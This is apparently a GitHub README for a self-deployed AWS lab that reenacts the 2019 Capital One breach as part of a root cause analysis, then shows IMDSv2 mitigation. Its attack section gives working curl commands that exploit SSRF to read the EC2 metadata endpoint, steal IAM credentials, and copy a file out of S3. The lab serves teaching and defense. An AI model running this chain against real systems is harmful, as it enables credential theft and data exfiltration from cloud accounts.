# CapitalOne-Breach-Simulation-Lab
Code and artifacts for the Adversary Emulation phase of a Root Cause Analysis of the 2019 Capital One breach report.

Based on the lab by Shay Raize Meshulam: [shayrm/CapitalOne-SSRF-demo](https://github.com/shayrm/CapitalOne-SSRF-demo)

# Purpose

This lab is designed for educational purposes to validate my CAPITAL One breach 2019 root cause analysis report to show how SSRF vulnerabilities can be exploited in a cloud environment, and then the danger of overly permissive IAM roles, how compromised EC2 metadata can lead to data breach from S3, and the effectiveness of IMDSv2 for mitigation. The lab was followed based on the GitHub repository that Say Raize Meshulam published as guidance, and modifications were made from the original main.tf file and the readme file addressed errors from the previous instruction.

#Prerequisites

AWS Account(Free tier is fine), EC2 Key Pair, AWS CLI, Terraform, Main.tf file, Local secret CSV file.

#Setup Instructions
1. Download main.tf and top_secret_file.csv into the local directory.
2. Modify main.tf. Please refer to the comments in the file and ensure your configuration is valid—region, key_pair, ubuntu-ami, bucket_name need to be changed.
3. Initialize Terraform by opening the terminal.tf file and local secret CSV file are installed and run:

terraform init

4. Validate Configuration: 

```bash
terraform fmt
terraform validate
terraform plan
```

5. Deploy the Lab:

```bash
terraform apply
```
Check that public_ip and instance_id are displayed correctly in the terminal.

Note the public_ip and instance_id from the output.

# Instructions for running  Attack Simulation

1. Check Server Response:

```bash
curl http://<public_ip>/
```
Replace <public_ip> with your public IP that you previously obtained on the transform apply stage.

2. Exploit SSRF to List Metadata:
```bash
curl "http://<public_ip>/?url=[http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)"
```

3. Navigate to Credentials:
```bash
curl "http://<public_ip>/?url=[http://169.254.169.254/latest/meta-data/iam/](http://169.254.169.254/latest/meta-data/iam/)"
curl "http://<public_ip>/?url=[http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/)"
```
The output will be the role name: c-demo-role


4. Steal Credentials: 
```bash
curl "http://<public_ip>/?url=[http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/)c-demo-role/"
```

The output will be a JSON object containing AccessKeyId, SecretAccessKey, and Token.


5. Configure Attacker Profile:
```bash
aws configure set aws_session_token [YOUR_TOKEN] --profile c-demo

aws configure --profile c-demo
```
Enter stolen AccessKeyId, SecretAccessKey, region (e.g., us-east-2), format (json)

Copy the credentials from the JSON output and leave the token blank at the aws configure --profile c-demo stage, you already entered it.



6. Verify Access and List Buckets:
```bash
aws s3 ls --profile c-demo
```

You should be able to see your unique bucket name

7. Exfiltrate Data: 
```bash
aws s3 ls s3://<bucket_name> --profile c-demo
aws s3 cp s3://<bucket_name>/top_secret_file.csv ./ --profile c-demo
```
(Replace <bucket_name> with your unique bucket name)

8. Verify that it is downloading to the correct directory and check the content inside
```bash
ls
cat top_secret_file
 ```

9. Mitigation

Enforce IMDSv2:
```bash
aws ec2 modify-instance-metadata-options --instance-id "<instance_id>" --http-tokens required --http-endpoint enabled
```
Use instance_id with the ID from the terraform apply output


Verify Mitigation: 
```bash
curl "http://<public_ip>/?url=[http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/)"
```
It should fail when you try to attempt it again.

10. Clean Up

To avoid unexpected AWS charges, destroy all created resources after you finish your activity:
```bash
terraform destroy
```
